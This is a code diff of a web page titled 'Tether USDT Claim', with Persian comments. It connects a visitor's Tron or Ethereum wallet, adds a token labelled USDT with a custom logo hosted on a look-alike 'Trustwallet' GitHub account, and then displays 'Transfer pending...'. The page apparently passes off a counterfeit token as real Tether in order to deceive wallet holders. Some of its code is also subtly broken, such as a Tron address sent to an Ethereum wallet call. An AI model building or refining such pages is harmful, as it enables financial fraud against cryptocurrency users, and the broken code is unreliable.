@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tether USDT Claim</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+    <script src="https://cdn.tronweb.org/tronweb/dist/tronweb.js"></script> <!-- اضافه کردن TronWeb -->
     <style>
         body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #fff; color: #333; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .container { text-align: center; padding: 40px; background: linear-gradient(135deg, #fff, #f9f9f9); border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); max-width: 500px; width: 100%; }
@@ -29,25 +30,8 @@
     </div>
 
     <script>
-        const contractAddress = "418E276B13EFE5A3E664C1B0A98E9F300FB48F93CB"; // آدرس هگز با 41 و حروف کوچک
-        const logoUrl = "https://raw.githubusercontent.com/Trustwallet000-design/Wallet/refs/heads/main/tether-logo.png"; // اسم کاربریت رو جایگزین کن
-        const abi = [
-            {"stateMutability": "Nonpayable", "type": "Constructor"},
-            {"anonymous": false, "inputs": [{"indexed": true, "name": "owner", "type": "address"}, {"indexed": true, "name": "spender", "type": "address"}, {"indexed": false, "name": "value", "type": "uint256"}], "name": "Approval", "type": "Event"},
-            {"anonymous": false, "inputs": [{"indexed": true, "name": "from", "type": "address"}, {"indexed": true, "name": "to", "type": "address"}, {"indexed": false, "name": "value", "type": "uint256"}], "name": "Transfer", "type": "Event"},
-            {"constant": true, "inputs": [{"name": "", "type": "address"}, {"name": "", "type": "address"}], "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "View", "type": "Function"},
-            {"constant": false, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "success", "type": "bool"}], "stateMutability": "Nonpayable", "type": "Function"},
-            {"constant": true, "inputs": [{"name": "", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "View", "type": "Function"},
-            {"constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "stateMutability": "View", "type": "Function"},
-            {"constant": true, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "stateMutability": "View", "type": "Function"},
-            {"constant": true, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "stateMutability": "View", "type": "Function"},
-            {"constant": true, "inputs": [], "name": "totalSupply", "outputs": [{"name": "", "type": "uint256"}], "stateMutability": "View", "type": "Function"},
-            {"constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "success", "type": "bool"}], "stateMutability": "Nonpayable", "type": "Function"},
-            {"constant": false, "inputs": [{"name": "_from", "type": "address"}, {"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "success", "type": "bool"}], "stateMutability": "Nonpayable", "type": "Function"}
-        ];
-
         async function connectWallet() {
-            if (window.tronWeb) { // استفاده از TronWeb برای تشخیص شبکه Tron
+            if (window.tronWeb) { // اولویت با TronWeb
                 try {
                     const address = await window.tronWeb.defaultAddress.base58;
                     const status = document.getElementById('status');
@@ -58,10 +42,10 @@
                         to: address,
                         callValue: 0,
                         data: 'TRC20_TOKEN_ADD',
-                        contractAddress: contractAddress
+                        contractAddress: "418E276B13EFE5A3E664C1B0A98E9F300FB48F93CB"
                     }, (error, result) => {
                         if (!error) {
-                            window.tronWeb.trx.addToken(contractAddress, 'USDT', 6, logoUrl, (err, res) => {
+                            window.tronWeb.trx.addToken("418E276B13EFE5A3E664C1B0A98E9F300FB48F93CB", 'USDT', 6, "https://raw.githubusercontent.com/Trustwallet000-design/Wallet/refs/heads/main/tether-logo.png", (err, res) => {
                                 if (!err) {
                                     status.innerText = "Success! USDT with custom logo added. Transfer pending...";
                                 } else {
@@ -79,9 +63,37 @@
                     status.innerText = "Error: " + error.message;
                     status.className = 'show error';
                 }
+            } else if (window.ethereum) { // فال‌بک به Web3
+                try {
+                    const web3 = new Web3(window.ethereum);
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
+                    const address = accounts[0];
+                    const status = document.getElementById('status');
+                    status.innerText = `Wallet Connected! Address: ${address.substring(0, 6)}...${address.slice(-4)}`;
+                    status.className = 'show';
+
+                    await window.ethereum.request({
+                        method: 'wallet_watchAsset',
+                        params: {
+                            type: 'TRC20', // مشخص کردن صریح TRC20
+                            options: {
+                                address: "418E276B13EFE5A3E664C1B0A98E9F300FB48F93CB",
+                                symbol: 'USDT',
+                                decimals: 6,
+                                image: "https://raw.githubusercontent.com/Trustwallet000-design/Wallet/refs/heads/main/tether-logo.png"
+                            }
+                        }
+                    });
+                    status.innerText = "Success! USDT with custom logo added. Transfer pending...";
+                } catch (error) {
+                    const status = document.getElementById('status');
+                    status.innerText = "Error: " + error.message;
+                    status.className = 'show error';
+                }
             } else {
                 const status = document.getElementById('status');
-                status.innerText = "Please install Trust Wallet with Tron support!";
+                status.innerText = "Please install Trust Wallet with Tron or Ethereum support!";
                 status.className = 'show error';
             }
         }
